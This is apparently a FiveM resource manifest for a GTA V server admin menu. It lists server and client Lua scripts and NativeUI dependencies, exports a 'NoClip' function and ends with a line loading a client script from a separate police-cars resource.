fx_version "adamant"

games {"gta5"}
lua54 'yes'
server_scripts {
	"util_shared.lua",
	"admin_server.lua",
}

client_scripts {
	"dependencies/NativeUI.lua",
	"dependencies/NativeUI-rdr3.lua",
	"dependencies/Controls.lua",
	"util_shared.lua",
	"admin_client.lua",
	"gui_c.lua",
}
exports {
	'NoClip'
}
client_script '@sattiva_police_cars/client.lua'